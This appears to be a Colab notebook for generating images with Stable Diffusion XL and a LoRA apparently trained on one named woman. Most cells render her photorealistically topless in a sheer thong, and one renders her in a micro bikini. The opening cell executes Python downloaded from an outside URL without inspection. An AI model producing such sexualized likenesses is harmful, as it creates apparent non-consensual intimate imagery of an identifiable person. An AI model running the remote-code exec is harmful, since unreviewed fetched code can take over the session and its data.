In [ ]:
# ═══ שחזור lana82 0:57-1:01 · Wan 2.2 I2V · הוזרק ע"י שימי פיתוח 16/10 ═══
# מריץ את תאי wan22_lea_colab.ipynb (2,4,6,7,8) בסשן הקיים
import urllib.request
exec(urllib.request.urlopen('https://aidoor.shimi.land/colab/wan_run_v21.py').read().decode())


In [ ]:
import subprocess, os
subprocess.run(["pip","install","-q","diffusers","transformers","accelerate","safetensors","huggingface_hub"], timeout=600)
import torch
from diffusers import StableDiffusionXLPipeline, EulerAncestralDiscreteScheduler
DEV = "cuda" if torch.cuda.is_available() else "cpu"
print("GPU:", torch.cuda.get_device_name(0) if DEV=="cuda" else "NO GPU")
pipe = StableDiffusionXLPipeline.from_pretrained("SG161222/RealVisXL_V5.0", torch_dtype=torch.float16, variant="fp16").to(DEV)
pipe.scheduler = EulerAncestralDiscreteScheduler.from_config(pipe.scheduler.config)
lora_ok = False
try:
    from huggingface_hub import hf_hub_download
    lp = hf_hub_download(repo_id="shimi-net/lea-lora", filename="lea_lora.safetensors", local_dir="/content/lora")
    from safetensors.torch import load_file
    sd = load_file(lp)
    mods = dict(pipe.unet.named_modules())
    pairs = {}
    for k, v in sd.items():
        if ".lora_down.weight" in k: pairs.setdefault(k.replace(".lora_down.weight",""),{})["down"]=v
        elif ".lora_up.weight" in k: pairs.setdefault(k.replace(".lora_up.weight",""),{})["up"]=v
        elif k.endswith(".alpha"): pairs.setdefault(k.replace(".alpha",""),{})["alpha"]=v
    applied=0
    for base,d in pairs.items():
        if "down" not in d or "up" not in d: continue
        name = base.replace("lora_unet_","")
        target=None
        for mn,m in mods.items():
            if mn.replace(".","_")==name and hasattr(m,"weight"): target=m;break
        if target is None: continue
        down=d["down"].to(torch.float32); up=d["up"].to(torch.float32)
        rank=down.shape[0]; alpha=float(d["alpha"]) if "alpha" in d else float(rank)
        delta=(up.reshape(up.shape[0],-1)@down.reshape(rank,-1))*(alpha/rank)*0.85
        target.weight.data += delta.reshape(target.weight.shape).to(target.weight.dtype).to(target.weight.device)
        applied+=1
    print("LORA MANUAL MERGE: applied", applied, "of", len(pairs))
    lora_ok = applied>0
except Exception as e:
    print("LORA FAILED:", str(e)[:300])
NEG = ("padded bra, sports bra, thick waistband, layered underwear, deformed hands, extra fingers, plastic skin, cartoon, blurry, lowres, watermark")
BASE = ("lea shimi woman, huge natural heavy bust, hourglass figure, narrow waist, wide round hips, olive tan skin with soft freckles, grey-green eyes, full dark brows, dark brown hair in a messy high bun with loose strands, topless, bare natural bust, wearing only a thin sheer floral lace thong, ")
SCENES = [
    ("standing by a bright window in morning light, direct gaze, full body", 832, 1216, 310101),
    ("sitting on the edge of a bed, leaning slightly forward, soft daylight, full body", 832, 1216, 310102),
    ("in a kitchen holding a coffee mug, warm smile, full body", 832, 1216, 310103),
    ("standing in front of a full-length mirror, direct gaze, full body", 832, 1216, 310104),
    ("seated on a soft rug in a bright bedroom, relaxed pose", 1216, 832, 310105),
    ("standing in a doorway with side light, confident pose, full body", 832, 1216, 310106),
]
os.makedirs("/content/out", exist_ok=True)
import time
for scene,w,h,seed in SCENES:
    prompt = BASE+scene+", natural skin texture with pores, photo"
    g=torch.Generator(DEV).manual_seed(seed)
    img=pipe(prompt=prompt,negative_prompt=NEG,width=w,height=h,num_inference_steps=32,guidance_scale=5.5,generator=g).images[0]
    fp=f"/content/out/lea_lora_{seed}.png"; img.save(fp); print("SAVED",seed,"lora",lora_ok,flush=True)
print("RENDER DONE", "lora_ok" if lora_ok else "lora_failed")


In [ ]:
# סל העלאה — יוקלד ידנית אחרי הריצה

In [ ]:
# ═══ רינדור: לאה בביקיני מינימלי — קנון מלא + לורה (16/10) ═══
from diffusers.utils import make_image_grid
PROMPT = ("photorealistic full body photograph of Leah, olive tan skin with soft freckles, grey-green eyes, "
          "full dark brows, full pink lips, dark brown hair in a messy high bun with loose strands, "
          "huge natural heavy bust, soft round belly, hourglass figure, narrow waist, wide round hips, "
          "wearing a minimal micro bikini, standing on a sunny beach, facing camera, natural light, sharp focus, head to feet")
NEG = "deformed, distorted, extra limbs, bad anatomy, plastic skin, thin, flat chest, blurry, watermark, text, child"
imgs = []
for seed in [161101, 161102, 161103]:
    g = torch.Generator(DEV).manual_seed(seed)
    img = pipe(PROMPT, negative_prompt=NEG, width=832, height=1216,
               num_inference_steps=28, guidance_scale=5.5, generator=g).images[0]
    img.save(f"/content/lea_bikini_{seed}.png")
    imgs.append(img)
make_image_grid(imgs, rows=1, cols=3)
